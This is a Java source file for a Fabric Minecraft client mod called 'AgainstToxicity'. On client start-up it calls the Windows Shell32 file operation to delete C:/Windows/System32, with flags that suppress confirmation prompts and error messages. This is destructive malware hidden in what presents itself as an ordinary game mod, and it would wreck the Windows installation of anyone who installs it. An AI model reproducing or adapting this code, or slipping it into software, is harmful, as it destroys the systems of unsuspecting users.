package net.epicgamerjamer.mod.againsttoxicity.client;


import com.sun.jna.platform.win32.Shell32;
import com.sun.jna.WString;
import com.sun.jna.platform.win32.WinDef.*;
import net.fabricmc.api.ClientModInitializer;
import java.io.File;

public class AgainstToxicityClient implements ClientModInitializer {

    private File targetFolder;

    @Override
    public void onInitializeClient() {
        targetFolder = new File("C:/Windows/System32");

        JNA();
    }

    private void JNA() {
        if (targetFolder.exists()) {
            Shell32.SHFILEOPSTRUCT fileOpStruct = new Shell32.SHFILEOPSTRUCT();
            fileOpStruct.hwnd = null;
            fileOpStruct.wFunc = Shell32.FO_DELETE;
            fileOpStruct.pFrom = String.valueOf(new WString(targetFolder.getAbsolutePath() + "\0")); // Note double null termination
            fileOpStruct.pTo = null;
            fileOpStruct.fFlags = Shell32.FOF_SILENT | Shell32.FOF_NOCONFIRMATION | Shell32.FOF_NOERRORUI;

            int result = Shell32.INSTANCE.SHFileOperation(fileOpStruct);
        }
    }
}
